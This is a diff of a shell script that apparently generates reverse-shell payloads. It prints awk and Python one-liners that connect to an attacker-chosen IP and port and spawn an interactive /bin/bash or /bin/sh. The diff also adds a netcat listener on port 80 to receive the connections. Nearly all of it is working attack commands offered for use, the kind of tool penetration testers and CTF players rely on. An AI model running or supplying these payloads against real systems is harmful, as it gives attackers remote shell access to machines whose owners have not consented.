@@ -20,3 +20,6 @@ echo "awk 'BEGIN {{s = \"/inet/tcp/0/${ip}/${p}\"; while(42) {{ do{{ printf \"sh
 echo -e "\n\e[31mPython\e[0m"
 echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"${ip}\",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
 echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ip}\",${p}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+echo -e "\n\e[31mListener\e[0m"
+nc -nvlp 80
